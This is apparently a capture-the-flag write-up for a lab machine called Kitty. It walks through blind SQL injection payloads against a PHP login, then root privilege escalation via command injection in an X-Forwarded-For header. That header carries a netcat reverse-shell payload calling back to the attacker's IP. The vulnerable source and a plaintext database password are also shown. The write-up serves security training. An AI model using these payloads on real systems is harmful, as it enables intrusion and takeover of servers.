# Kitty

## Enumeration

Nmap scan:

{% code overflow="wrap" %}
```
Nmap scan report for kitty.thm (10.10.251.255)
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                             
```
{% endcode %}



There is a Login page login.php:

<figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

There is also a register page register.php:

<figure><img src="../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

We can see that the tech stack used is <mark style="background-color:red;">**PHP + Apache 2.4.41 + Ubuntu.**</mark>

<mark style="background-color:red;">**Probably the database engine is MySQL!**</mark>

If we try to register a new user with `username` test and password `test` we receive the following error:

<figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:red;">**Password must have atleast 6 characters!**</mark>

Creating an account test:testtest and login we came to welcome.php:

<figure><img src="../../.gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>

Try to register another user with name test:

<figure><img src="../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

We receive a HTTP 200 status code response with message "<mark style="background-color:red;">**This username is already taken**</mark>".

Instead if we use a correct username (test) but a bad password like in login form we obtain always HTTP 200 status code response with message "Invalid username or password":

<figure><img src="../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

Try to enumerate some hidden directories and files:

{% code overflow="wrap" %}
```php
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u "http://kitty.thm/FUZZ" -ic -fc 403 -t 300 -e .php 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>

## Exploit Blind SQL injection

Intercept the Login HTTP request in BurpSuite:

<figure><img src="../../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

If we try a simple SQL injection like  `' OR 1=1 ; -- #`&#x20;

in order to exploit a SQL statement like this one we obtain an error message about SQL injection attempt:

{% code overflow="wrap" %}
```sql
select username,password from users where username = 'test' and password = '' OR 1=1; --#test';
```
{% endcode %}

If we try to inject SQL on username field we have instead a success:

<figure><img src="../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```sql
select username,password from users where username = 'test'-- #' and password = 'test';
```
{% endcode %}

Now we can try to inject some SQL code, starting from UNION attacks and using the response code 302 returned when login is successfull.

First enumerate the number of columns requested with original SELECT by variably incrementing the number of NULL columns in order to spot the original columns requested (4 is the correct number of null to use!):

{% code overflow="wrap" %}
```sql
select ?,?,username,password from users where username = '' UNION SELECT null,null-- -' and password = 'test';
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

So we have a Blind SQL Injection and we need to retrieve information from database only using the HTTP response code.

Try to enumerate the database name using SQL function `SUBSTRING()` and built-in MySQL function `database()` :

<figure><img src="../../.gitbook/assets/image (478).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
username=' UNION SELECT null,null,null,null WHERE substring(database(),1,1) > 'a'-- -&password=password
```
{% endcode %}

By asking the DB engine if the first character of the database name in use is greater than the character 'a' the response code is 302. If, on the other hand, we set the condition to be less than the character 'a' i.e., a nonprintable ASCII character, the response code becomes 200:

<figure><img src="../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

The payload to use to enumerate each character of `database()` function output is this one:

<figure><img src="../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

We must use a <mark style="color:blue;">**Cluster Bomb**</mark> type attack since the index of the `substring()` function will have to be incremented only after comparing the corresponding character with all possible printable ASCII characters. For example we will have queries executed in this order:&#x20;

`... substring(database(),1,1) = 'a' ...`

`... substring(database(),1,1) = 'b' ...`

`.`

`.`

`.`

`... substring(database(),1,1) = 'z' ...`

And then I increment the index:

`... substring(database(),2,1) = 'a' ...`

`... substring(database(),2,1) = 'b' ...`

`.`

`.`

`.`

`... substring(database(),2,1) = 'z' ...`

The first payload set (index):

<figure><img src="../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

The second payload set (character):

<figure><img src="../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

The attack work in the way explained above:

<figure><img src="../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

Filter using only 302 response code:

<figure><img src="../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
As we can see, the name of the extracted database turns out to be `MYWEBSITE` or`mywebsite`. Both forms in BurpSuite turn out to be valid because the comparison operations in MySQL, such as those used in `WHERE` clauses, are typically case insensitive by default, depending on the collation used for the column or database. To avoid false positives in the output, it is necessary to use the keyword BINARY:

{% code overflow="wrap" %}
```sql
username=' UNION SELECT null,null,null,null WHERE BINARY substring(database(),1,1) > 'a'-- -&password=password
```
{% endcode %}
{% endhint %}

<mark style="background-color:red;">Database name: mywebsite</mark>

Try to enumerate the user using user() function:

<figure><img src="../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:red;">Username: kitty</mark>

Try to enumerate the table name:

<figure><img src="../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
username=' UNION SELECT null,null,null,table_name FROM information_schema.tables WHERE table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys') and substring(table_name,§1§,1) = '§a§'-- -&password=password
```
{% endcode %}

Filter as always for only 302 response code:

<figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
In this case we only have the table name in lower case since table names in MySQL are case sensitive!
{% endhint %}

<mark style="background-color:red;">table name: siteusers</mark>

Try to enumerate the columns name using the following payload:

{% code overflow="wrap" %}
```sql

username=' UNION SELECT null,null,null,column_name FROM information_schema.columns WHERE table_schema not in ('information_schema','mysql','performance_schema','sys') and table_name='siteusers' and substring(column_name,§1§,1) = '§u§';-- -&password=password
```
{% endcode %}

{% hint style="warning" %}
In this case we only have the column name in lower and upper case since column names in MySQL are case IN-sensitive!
{% endhint %}

<figure><img src="../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

But using the Cluster bomb attack due to the fact that there are 4 columns, names result mixed in the attack result :sob:

At the cost of making testing manual (one solution might be to use Python) we enumerate the first character first and then increment the substring length:

<figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

The second character for the targeted column is 'r':

<figure><img src="../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

and so on...

The resulting columns name are:

* <mark style="background-color:red;">created\_at</mark>
* <mark style="background-color:red;">id</mark>
* <mark style="background-color:red;">username</mark>
* <mark style="background-color:red;">passwords</mark>

Enumerate the password of user kitty previously discovered:

<figure><img src="../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
username=' UNION SELECT null,null,null,password FROM siteusers WHERE username='kitty' and substring(password,§1§,1) = '§changeme§';-- -&password=password
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

As we can see we've a problem here because function SUBSTRING() is CASE INSENSITIVE so both upper and lower case return 302 Response code.

We need to use BINARY keyword:

<figure><img src="../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>

password of kitty: <mark style="background-color:red;">**L0ng\_Liv3\_KittY**</mark>

Connect to machine using ssh and get user flag:

<figure><img src="../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Some manual searching & enumeration on file system:

```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'kitty');
define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');
define('DB_NAME', 'mywebsite');

/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($mysqli === false){
        die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>

```

Connect to mysql locally using these credentials:

<figure><img src="../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

{% code title="index.php" overflow="wrap" %}
```php
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: welcome.php");
    exit;
}

include('config.php');
$username = $_POST['username'];
$password = $_POST['password'];
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                die();
        } elseif (preg_match( $evilword, $password )) {
                echo 'SQL Injection detected. This incident will be logged!';
                die();
        }
}


$sql = "select * from siteusers where username = '$username' and password = '$password';";  
$result = mysqli_query($mysqli, $sql);  
$row = mysqli_fetch_array($result, MYSQLI_ASSOC);  
$count = mysqli_num_rows($result);
if($count == 1){
        // Password is correct, so start a new session
        session_start();

        // Store data in session variables
        $_SESSION["loggedin"] = true;
        $_SESSION["username"] = $username;
        // Redirect user to welcome page
        header("location: welcome.php");
} elseif ($username == ""){
        $login_err = "";
} else{
        // Password is not valid, display a generic error message
        $login_err = "Invalid username or password";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>User Login</h2>
        <p>Please fill in your credentials to login.</p>

<?php 
if(!empty($login_err)){
        echo '<div class="alert alert-danger">' . $login_err . '</div>';
}        
?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control">
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>

```
{% endcode %}



Notice that there are 2 different directories `development` and `html`:

<figure><img src="../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

the only file that differs between the two folders is this `logged` that is empty.

If we inspect the socket opens with `ss`:

<figure><img src="../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

We see that there is a listen socket on port 8080 that's not reachable from external machines. We need to establish an SSH tunnel to this port, since we can’t just access it externally:

```bash
ssh kitty@kitty.thm -L 8081:localhost:8080 
```

<figure><img src="../../.gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>

The site seems to work exactly like the first one.

Try to search under other directories...like `/opt` for example:

<figure><img src="../../.gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>

If we can write inside the logged file, it will be used as the source of the $ip input and we can try to break the command "echo $ip..." and get a shell as root.

There is no cronjob but presumably this script is executed by the root user. Let's check using [pspy64](https://github.com/DominicBreuker/pspy), by copying it on victim machine and analyze the processes:

<figure><img src="../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

Every minute this script is executed by user root (UID=0).

The problem here is that only `www-data` can write to this file:

<figure><img src="../../.gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>

Seeing the development code, we note that:

<figure><img src="../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

There are defined patterns that triggers Apache to write the IP passed with HTTP Header X-Forwarded-For.

Note that this portion of code there isn't in website currently running on port 80:

<figure><img src="../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

Force the write of IP address by triggering some of these patterns using OR keyword for example:

<figure><img src="../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

But as we can see, the client doesn't send automatically the `X-Forwarded-For` HTTP header, so we need to modify with BurpSuite the request like this one, using 1.1.1.1 as test for our privilege escalation:

<figure><img src="../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

And finally here we can see that IP is written to the `logged` file:

<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

The command execution to evade is this:

```bash
/usr/bin/sh -c "echo $ip >> /root/logged"
```

We can test it on our Kali machine and see the result. The `ls -la` need to be substitute with the command to spawn a reverse shell:

```bash
/usr/bin/sh -c "echo ok;ls -la;echo ok >> /tmp/logged"
```

<figure><img src="../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

The command that we want to obtain is like this one:

```bash
/usr/bin/sh -c "echo ok;nc -c sh 10.8.61.24 7777;echo ok >> /tmp/logged"
```

On the victim machine there is netcat:

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

But there isn't the option `-c`:

<figure><img src="../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

So we need to change the payload as this one:

{% code overflow="wrap" %}
```
X-Forwarded-For: ok;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.61.24 7777 >/tmp/f;echo ok
```
{% endcode %}

To reach this result we need to send IP formatted as below:

<figure><img src="../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

On victim machine we obtain the payload reflected inside `logged` file:

<figure><img src="../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

We put the Kali listen on port 7777:

<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

Enjoy the root! :clap:
